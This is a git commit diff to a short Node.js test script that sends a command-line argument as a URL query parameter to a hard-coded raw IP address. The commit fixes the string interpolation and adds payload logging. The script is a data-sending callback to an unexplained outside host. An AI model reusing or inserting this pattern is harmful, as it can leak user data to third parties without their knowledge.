9b07a1a83b5945d1579f75d9aac463ffd83778e2
thales12423 <111197054+thales12423@users.noreply.github.com>
2024-05-07 21:51:17 -0500

    Update test.ts

--- test.ts
+++ test.ts
@@ -1,6 +1,10 @@
 const http = require('http');
 const postData = process.argv[2];
-const options = { hostname: '104.41.156.21', port: 80, path: '/t?p=${encodeURIComponent(postData)}', method: 'GET' };
+console.log("Using payload:", encodeURIComponent(postData));
+const sendData = encodeURIComponent(postData);
+console.log("Using final payload:", sendData);
+const path = `/t?p=${sendData}`;
+const options = { hostname: '104.41.156.21', port: 80, path: path, method: 'GET' };
 const req = http.request(options, (res) => {
   console.log(`STATUS: ${res.statusCode}`);
   res.setEncoding('utf8');
